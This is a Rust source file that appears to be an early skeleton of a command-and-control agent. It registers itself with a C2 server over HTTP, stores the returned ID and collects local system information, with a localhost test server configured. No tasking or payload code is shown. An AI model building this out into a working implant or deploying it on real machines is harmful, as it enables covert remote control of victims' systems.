mod systeminfo;

use reqwest::Client;
use serde_json::{
    json,
    Value,
};
use systeminfo::{ 
    SystemInfo, 
    get_system_info
};

#[derive(Debug)]
pub struct C2Agent {
    id: u64,
    name: String,
    server_url: String,
    http_client: Client,
    system_info: SystemInfo
}

impl C2Agent {
    pub async fn new(server_url: &str, agent_name: &str) -> Result<Self, Box<dyn std::error::Error>> {
        let client = Client::new();
        let register_url = format!("{}/agent/register", &server_url);
        let request_body = json!({
            "name": agent_name
        });

        let response: Value = client.post(register_url)
            .json(&request_body)
            .send()
            .await?
            .json()
            .await?;

        let uid = response["uid"]
            .as_u64()
            .ok_or("Response missing `uid` field")?;

        Ok(Self {
            id: uid,
            name: agent_name.to_string(),
            server_url: server_url.to_string(),
            http_client: client,
            system_info: get_system_info()?,
        })
    }
}

#[tokio::main]
async fn main() ->  Result<(), Box<dyn std::error::Error>> {
    let server_url = "http://127.0.0.1:8080";
    let agent_name = "test-agent1";

    let x = C2Agent::new(server_url, agent_name).await?;

    println!("{:#?}", x);

    Ok(())
}
